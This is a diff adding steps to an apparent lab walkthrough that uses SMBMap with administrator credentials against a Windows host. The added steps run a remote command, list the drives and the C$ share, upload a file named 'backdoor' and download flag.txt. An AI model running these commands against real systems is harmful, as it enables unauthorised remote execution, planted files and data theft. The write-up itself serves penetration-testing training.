@@ -79,6 +79,91 @@ Command: smbmap -u administrator -p *password_not_shown* -d . -H 10.3.21.33
 <br />
 <br />
 <br />
+Use SMBMap to try running a command: <br/>
+- It looks like the ipconfig command did run. This is potentially very dangerouse as we now have remote code execution connecting via SMB. <br/>
+<br/>
+Command: smbmap -u administrator -p *password_not_shown* -H 10.3.21.33 -x 'ipconfig'
+<br/>
+<br/>
+<img src="https://i.imgur.com/6JPwAOz.png" height="80%" width="80%" alt="SMB Nmap Scripting" class="center"/>
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+Use SMBMap to list drives on host: <br/>
+<br/>
+Command: smbmap -u administrator -p *password_not_shown* -H 10.3.21.33 -L
+<br/>
+<br/>
+<img src="https://i.imgur.com/8tDruC9.png" height="80%" width="80%" alt="SMB Nmap Scripting" class="center"/>
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+Use SMBMap to list the contents of the C:\ drive: <br/>
+- It looks like there is a flag.txt file located in the drive. <br/>
+<br/>
+Command: smbmap -u administrator -p *password_not_shown* -H 10.3.21.33 -r C$
+<br/>
+<br/>
+<img src="https://i.imgur.com/Pxp0sJZ.png" height="80%" width="80%" alt="SMB Nmap Scripting" class="center"/>
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+Use SMBMap to create a file called backdoor and place it in the C:\ drive: <br/>
+<br/>
+Commands: touch backdoor <br/>
+smbmap -u administrator -p *password_not_shown* -H 10.3.21.33 --upload /root/backdoor C$/backdoor
+<br/>
+<br/>
+<img src="https://i.imgur.com/tvGIk80.png" height="80%" width="80%" alt="SMB Nmap Scripting" class="center"/>
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+Use SMBMap to verify that we uploaded the backdoor file to the C:\ drive: <br/>
+- We can see that the backdoor file is now located in the C: Drive. <br/>
+<br/>
+Command: smbmap -u administrator -p *password_not_shown* -H 10.3.21.33 -r C$
+<br/>
+<br/>
+<img src="https://i.imgur.com/tWKeyjH.png" height="80%" width="80%" alt="SMB Nmap Scripting" class="center"/>
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+Use SMBMap to download the flag.txt file that we seen earlier in the C:\ drive: <br/>
+- We can see that the we were able to download the flag.txt file. We then can use cat to show us what's in the flag.txt file as shown below. <br/>
+<br/>
+Commands: smbmap -u administrator -p *password_not_shown* -H 10.3.21.33 --download 'C$\flag.txt'
+ <br/>
+ cat /root/10.3.21.33-C_flag.txt
+<br/>
+<br/>
+<img src="https://i.imgur.com/FXL8GSu.png" height="80%" width="80%" alt="SMB Nmap Scripting" class="center"/>
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
 
 </p>
 
